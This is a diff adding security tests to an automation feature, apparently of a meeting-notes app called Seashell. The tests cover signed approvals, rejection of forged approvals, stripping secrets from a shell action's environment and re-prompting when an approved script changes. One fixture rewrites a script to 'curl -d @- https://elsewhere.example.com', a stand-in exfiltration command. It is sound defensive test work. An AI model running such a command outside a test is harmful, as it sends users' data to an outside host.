@@ -1,10 +1,11 @@
 import { afterEach, expect, test } from 'bun:test';
-import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, symlinkSync, writeFileSync } from 'fs';
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from 'fs';
 import { tmpdir } from 'os';
-import { join } from 'path';
+import { dirname, join } from 'path';
 import {
   afterMeetingReady,
   automationApprovalsPath,
+  commandProgram,
   createAutomation,
   ensureAutomationsDirectory,
   loadAutomations,
@@ -19,6 +20,7 @@ import {
 } from '../src/automations.ts';
 import { automationState } from '../src/SettingsScreen.tsx';
 import { isPublicAddress, postWebhook } from '../src/webhook-post.ts';
+import { approvalKey, type KeychainCommand } from '../src/approval-key.ts';
 import { ensureExtractorsDirectory } from '../src/extractors.ts';
 import type { runHumainMeeting } from '../src/humain-client.ts';
 import { createMeetingArtifact, loadMeetingArtifact, saveMeetingArtifact } from '../src/meeting-artifact.ts';
@@ -127,7 +129,8 @@ test('shell and webhook actions ask first, once per version of the file, and rem
     notes: { status: 'final', items: [{ type: 'decision', text: 'Ship on Friday.', evidenceSegmentIds: ['s000001'] }] },
     transcript: [{ id: 's000001', speaker: 'Microphone', text: 'We ship on Friday.' }] });
   expect(posts.map((post) => post.url)).toEqual(['https://hooks.example.com/x', 'https://hooks.example.com/x']);
-  expect(JSON.parse(readFileSync(automationApprovalsPath(env), 'utf8')).approvals).toHaveProperty(loadAutomations(root, env).automations[0]!.hash);
+  expect(Object.values(JSON.parse(readFileSync(automationApprovalsPath(env), 'utf8')).approvals))
+    .toEqual([{ name: 'Send', decision: 'allow', at: expect.any(String), signature: expect.stringMatching(/^[0-9a-f]{64}$/u) }]);
 
   // Any edit to the file asks again; a "no" is remembered and nothing is sent.
   updateAutomation(root, 'Send', { actions: [{ kind: 'shell', command: './other.sh' }] }, env);
@@ -295,4 +298,95 @@ test('only internet addresses count as public', () => {
     '2001:db8::1', 'not an address']) {
     expect(isPublicAddress(address)).toBe(false);
   }
+});
+
+test('an approval written into the file by anything but Seashell counts for nothing', async () => {
+  const { root, record, env } = library();
+  automation(env, 'send.md', '---\nname: Send\n---\n- shell: ./file.sh\n');
+  const { hash } = loadAutomations(root, env).automations[0]!;
+  const forged = { name: 'Send', decision: 'allow', at: '2026-10-05T09:00:00Z' };
+  mkdirSync(dirname(automationApprovalsPath(env)), { recursive: true });
+  // As the old format wrote it, and as the new one does, with a made-up signature.
+  writeFileSync(automationApprovalsPath(env), JSON.stringify({ schemaVersion: 1, approvals: { [hash]: forged } }));
+  const ran: string[] = [];
+  const options = { env, trigger: 'manual' as const, shell: async (command: string) => { ran.push(command); return { code: 0 }; } };
+  expect((await runAutomations(root, record.id, options))[0]!.actions[0]!.status).toBe('skipped');
+  writeFileSync(automationApprovalsPath(env), JSON.stringify({ schemaVersion: 2,
+    approvals: Object.fromEntries(['a', 'b'].map((id) => [id.repeat(64), { ...forged, signature: '0'.repeat(64) }])) }));
+  expect((await runAutomations(root, record.id, options))[0]!.actions[0]!.status).toBe('skipped');
+  expect(ran).toEqual([]);
+  // Seashell's own yes is signed, and holds.
+  await runAutomations(root, record.id, { ...options, ask: async () => 'allow' });
+  await runAutomations(root, record.id, options);
+  expect(ran).toEqual(['./file.sh', './file.sh']);
+});
+
+test('an approved script that changes asks again, and the dialog names the file that runs', async () => {
+  const { home, root, record, env } = library();
+  const script = join(home, 'bin', 'file-call.sh');
+  mkdirSync(dirname(script));
+  writeFileSync(script, '#!/bin/sh\ncat > /dev/null\n', { mode: 0o700 });
+  automation(env, 'file.md', `---\nname: File it\n---\n- shell: SEASHELL_MODE=fast "${script}" --today\n`);
+  const asked: string[][] = [];
+  const ran: string[] = [];
+  const options = (answer?: 'allow') => ({ env, trigger: 'manual' as const,
+    ask: async (request: AutomationApprovalRequest) => { asked.push(request.actions); return answer; },
+    shell: async (command: string) => { ran.push(command); return { code: 0 }; } });
+  await runAutomations(root, record.id, options('allow'));
+  expect(asked).toEqual([[`Run: SEASHELL_MODE=fast "${script}" --today (runs ${realpathSync(script)})`]]);
+  await runAutomations(root, record.id, options());
+  expect([asked.length, ran.length]).toEqual([1, 2]);
+  writeFileSync(script, '#!/bin/sh\ncurl -d @- https://elsewhere.example.com\n', { mode: 0o700 });
+  await runAutomations(root, record.id, options());
+  expect([asked.length, ran.length]).toEqual([2, 2]);
+});
+
+test('the program a command runs is found as the shell would find it', () => {
+  const folder = mkdtempSync(join(tmpdir(), 'seashell-program-'));
+  roots.push(folder);
+  writeFileSync(join(folder, 'tool'), '#!/bin/sh\n', { mode: 0o700 });
+  const tool = realpathSync(join(folder, 'tool'));
+  expect(commandProgram('tool --x', undefined, folder)).toBe(tool);
+  expect(commandProgram(`A=1 B='two words' ${join(folder, 'tool')}`, undefined, '')).toBe(tool);
+  expect(commandProgram(`'${folder}/to'ol | wc`, undefined, '')).toBe(tool);
+  expect(commandProgram('./tool', folder, '')).toBe(tool);
+  expect(commandProgram('./tool', undefined, '')).toBeUndefined();
+  expect(commandProgram('$TOOL --x', undefined, folder)).toBeUndefined();
+  expect(commandProgram('missing', undefined, folder)).toBeUndefined();
+});
+
+test('a shell action gets a minimal environment, never Seashell\'s own secrets', async () => {
+  const scratch = mkdtempSync(join(tmpdir(), 'seashell-shell-env-'));
+  roots.push(scratch);
+  process.env.SEASHELL_TEST_SECRET = 'sk-made-up';
+  try {
+    const out = join(scratch, 'env.txt');
+    expect(await runShellAction(`env > ${JSON.stringify(out)}`, '{}', { SEASHELL_MEETING_ID: 'x', SEASHELL_MEETING_DIR: scratch }, scratch)).toEqual({ code: 0 });
+    const names = readFileSync(out, 'utf8').trim().split('\n').map((line) => line.split('=')[0]!);
+    // sh adds PWD, SHLVL and _ itself.
+    expect(names.filter((name) => !['PWD', 'OLDPWD', 'SHLVL', '_'].includes(name)).sort())
+      .toEqual(['HOME', 'LANG', 'PATH', 'SEASHELL_MEETING_DIR', 'SEASHELL_MEETING_ID', 'TMPDIR']);
+  } finally { delete process.env.SEASHELL_TEST_SECRET; }
+});
+
+test('approvals are signed with a key from the Keychain, or a private file beside them when it is not there', () => {
+  const { home } = library();
+  const items = new Map<string, string>();
+  const calls: string[] = [];
+  const keychain: KeychainCommand = (args) => {
+    calls.push(args[0]!);
+    const service = args[args.indexOf('-s') + 1]!;
+    if (args[0] === 'add-generic-password') { items.set(service, args[args.indexOf('-w') + 1]!); return { status: 0, stdout: '' }; }
+    return items.has(service) ? { status: 0, stdout: `${items.get(service)}\n` } : { status: 44, stdout: '' };
+  };
+  const approvals = join(home, 'Support', 'automation-approvals.json');
+  const first = approvalKey(approvals, {}, keychain);
+  expect(first.store).toBe('keychain');
+  expect(approvalKey(approvals, {}, keychain).key.equals(first.key)).toBe(true);
+  expect(calls).toEqual(['find-generic-password', 'add-generic-password', 'find-generic-password', 'find-generic-password']);
+  expect(existsSync(join(home, 'Support', 'automation-approvals.key'))).toBe(false);
+  const locked = approvalKey(approvals, {}, () => ({ status: 51, stdout: '' }));
+  expect(locked).toMatchObject({ store: 'file', note: expect.stringContaining('The Keychain was not available (security exited 51)') });
+  expect(statSync(join(home, 'Support', 'automation-approvals.key')).mode & 0o777).toBe(0o600);
+  expect(approvalKey(approvals, {}, undefined).key.equals(locked.key)).toBe(true);
 });
